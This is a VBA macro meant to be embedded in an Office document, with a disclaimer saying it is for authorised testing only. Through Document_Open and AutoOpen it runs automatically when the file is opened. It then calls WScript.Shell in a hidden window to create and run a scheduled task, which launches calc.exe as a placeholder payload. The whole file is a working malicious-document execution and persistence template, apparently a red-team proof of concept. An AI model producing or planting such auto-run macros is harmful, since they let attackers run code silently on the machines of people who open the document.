' ===============================================
' Author: Maerih
' Disclaimer: This code is for educational purposes only
' Use only in authorized testing environments
' ===============================================

Sub Document_Open()
    MyMacro
End Sub
Sub AutoOpen()
    MyMacro
End Sub
Sub MyMacro()
    Dim ws As Object
    Set ws = CreateObject("WScript.Shell")
    ws.Run "schtasks /create /tn ""TestTask"" /tr ""calc.exe"" /sc once /st 00:00", 0, True
    ws.Run "schtasks /run /tn ""TestTask""", 0, False
End Sub